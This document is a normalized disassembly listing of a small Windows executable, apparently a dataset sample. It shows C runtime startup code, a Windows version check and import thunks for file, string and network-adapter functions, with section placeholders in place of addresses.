lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_40386e
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_40153c
push 0x0
call exit
sub_402400
sub esp 0x94
lea eax [ esp ]
mov [ esp ] 0x94
push eax
call [ GetVersionExA@IAT ]
mov ecx [ esp + 0x10 ]
xor eax eax
cmp ecx 0x2
sete al
add esp 0x94
retn
sub_4034c0
retn
exit
jmp [ exit@IAT ]
fclose
jmp [ fclose@IAT ]
_filbuf
jmp [ _filbuf@IAT ]
fopen
jmp [ fopen@IAT ]
strrchr
jmp [ strrchr@IAT ]
sprintf
jmp [ sprintf@IAT ]
_sleep
jmp [ _sleep@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
fwrite
jmp [ fwrite@IAT ]
strtok
jmp [ strtok@IAT ]
fprintf
jmp [ fprintf@IAT ]
strncmp
jmp [ strncmp@IAT ]
free
jmp [ free@IAT ]
strstr
jmp [ strstr@IAT ]
atoi
jmp [ atoi@IAT ]
fscanf
jmp [ fscanf@IAT ]
malloc
jmp [ malloc@IAT ]
strncpy
jmp [ strncpy@IAT ]
_snprintf
jmp [ _snprintf@IAT ]
realloc
jmp [ realloc@IAT ]
fflush
jmp [ fflush@IAT ]
_filelength
jmp [ _filelength@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_40385c
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_40386e
xor eax eax
retn
sub_403871
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
GetAdaptersInfo
jmp [ GetAdaptersInfo@IAT ]
_strdup
jmp [ _strdup@IAT ]
sub_4038a0
mov eax r--data
jmp __CxxFrameHandler
